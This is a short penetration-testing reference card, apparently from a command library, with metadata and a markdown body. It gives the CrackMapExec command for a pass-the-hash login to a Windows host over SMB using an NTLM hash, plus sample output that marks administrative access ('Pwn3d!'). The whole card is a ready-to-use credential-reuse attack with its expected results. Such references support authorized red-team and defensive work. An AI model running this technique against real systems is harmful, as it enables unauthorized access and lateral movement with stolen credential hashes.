---
id: 8a79fed2-8160-4a6b-99f7-4780c47f264e
name: CrackMapExec Authenticate with SMB Using an NTLM Hash
type: command
executor: ''
data: crackmapexec smb $TARGET_IP -u $USERNAME -H $NTLM_HASH
output: 'root@kali:~/Documents# crackmapexec smb 10.10.10.10 -u Bob -H 6608e4bc7b2b7a5f77ce3573570775af

  [*] First time use detected

  [*] Creating home directory structure

  [*] Initializing the database

  [*] Copying default configuration file

  [*] Generating SSL certificate

  CME          10.10.10.10:445 BOB-PC [*] Windows 10.0 Build 18362 (name:BOB-PC) (domain:BOB-PC)

  CME          10.10.10.10:445 BOB-PC [+] BOB-PC\Victim 6608e4bc7b2b7a5f77ce3573570775af
  (Pwn3d!)

  [*] KTHXBYE!'
created_at: '2019-10-01T17:58:48.949200+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# CrackMapExec Authenticate with SMB Using an NTLM Hash

```bash
crackmapexec smb $TARGET_IP -u $USERNAME -H $NTLM_HASH
```

## Expected Output

```
root@kali:~/Documents# crackmapexec smb 10.10.10.10 -u Bob -H 6608e4bc7b2b7a5f77ce3573570775af
[*] First time use detected
[*] Creating home directory structure
[*] Initializing the database
[*] Copying default configuration file
[*] Generating SSL certificate
CME          10.10.10.10:445 BOB-PC [*] Windows 10.0 Build 18362 (name:BOB-PC) (domain:BOB-PC)
CME          10.10.10.10:445 BOB-PC [+] BOB-PC\Victim 6608e4bc7b2b7a5f77ce3573570775af (Pwn3d!)
[*] KTHXBYE!
```
